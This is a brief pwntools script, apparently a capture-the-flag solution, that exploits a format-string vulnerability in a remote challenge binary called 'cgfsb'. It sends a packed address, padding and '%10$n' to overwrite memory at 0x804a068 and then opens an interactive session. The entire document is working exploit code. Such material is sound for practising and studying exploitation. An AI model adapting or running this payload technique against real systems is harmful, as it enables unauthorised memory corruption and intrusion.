from pwn import *
context.log_level ='debug'
#sh = process('./cgfsb')

sh = remote('111.198.29.45','31517')
sh.recvuntil('name:\n')
sh.sendline('name')
sh.recvuntil('se:\n')

pay = p32(0x804a068)+'bbbb'+'%10$n'
sh.sendline(pay)
#gdb.attach(sh)
print sh.recv()
sh.interactive()
